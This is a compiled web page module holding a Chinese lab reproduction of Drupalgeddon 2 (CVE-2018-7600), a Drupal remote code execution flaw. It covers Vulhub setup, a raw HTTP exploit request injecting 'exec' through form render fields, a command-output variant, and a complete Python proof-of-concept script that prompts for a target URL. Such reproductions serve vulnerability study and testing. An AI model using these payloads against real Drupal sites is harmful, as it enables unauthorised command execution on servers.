import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const r={},c=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。相关分析如下：",-1),d={href:"https://research.checkpoint.com/uncovering-drupalgeddon-2/",target:"_blank",rel:"noopener noreferrer"},k=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动drupal 8.5.0的环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080/</code>将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p><p>安装方式参考CVE-2014-3704</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>向安装完成的drupal发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221948098.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9),m={href:"https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py",target:"_blank",rel:"noopener noreferrer"},v=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221942007.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以执行命令，将结果输出到1.txt</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>payload = {&#39;form_id&#39;: &#39;user_register_form&#39;, &#39;_drupal_ajax&#39;: &#39;1&#39;, &#39;mail[#post_render][]&#39;: &#39;exec&#39;, &#39;mail[#type]&#39;: &#39;markup&#39;, &#39;mail[#markup]&#39;: &#39;echo \`ls -al\` | tee 1.txt&#39;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>查看1.txt文件内容，即<code>ls -al</code>命令执行结果</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222018658.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests

<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;################################################################&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;# Proof-Of-Concept for CVE-2018-7600&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;# by Vitalii Rudnykh&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;# https://github.com/a2u/CVE-2018-7600&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;################################################################&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;Provided only for educational or information purposes\\n&#39;</span><span class="token punctuation">)</span>

target <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;Enter target url (example: https://domain.ltd/): &#39;</span><span class="token punctuation">)</span>

<span class="token comment"># Add proxy support (eg. BURP to analyze HTTP(s) traffic)</span>
<span class="token comment"># set verify = False if your proxy certificate is self signed</span>
<span class="token comment"># remember to set proxies both for http and https</span>
<span class="token comment"># </span>
<span class="token comment"># example:</span>
<span class="token comment"># proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8080&#39;}</span>
<span class="token comment"># verify = False</span>
proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
verify <span class="token operator">=</span> <span class="token boolean">True</span>

url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39;</span> 
payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;form_id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;user_register_form&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;_drupal_ajax&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;mail[#post_render][]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;exec&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;mail[#type]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;markup&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;mail[#markup]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;echo &quot;;-)&quot; | tee hello.txt&#39;</span><span class="token punctuation">}</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span>verify<span class="token punctuation">)</span>
check <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;hello.txt&#39;</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> verify<span class="token operator">=</span>verify<span class="token punctuation">)</span>
<span class="token keyword">if</span> check<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
  sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">&quot;Not exploitable&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;\\nCheck: &#39;</span><span class="token operator">+</span>target<span class="token operator">+</span><span class="token string">&#39;hello.txt&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function g(b,h){const a=o("ExternalLinkIcon");return i(),l("div",null,[c,u,n("ul",null,[n("li",null,[n("a",d,[s("https://research.checkpoint.com/uncovering-drupalgeddon-2/"),e(a)])])]),k,n("p",null,[s("参考"),n("a",m,[s("a2u/CVE-2018-7600"),e(a)]),s("，成功写入文件hello.txt：")]),v])}const x=p(r,[["render",g],["__file","Drupal Drupalgeddon 2 远程代码执行漏洞 CVE-2018-7600.html.vue"]]);export{x as default};
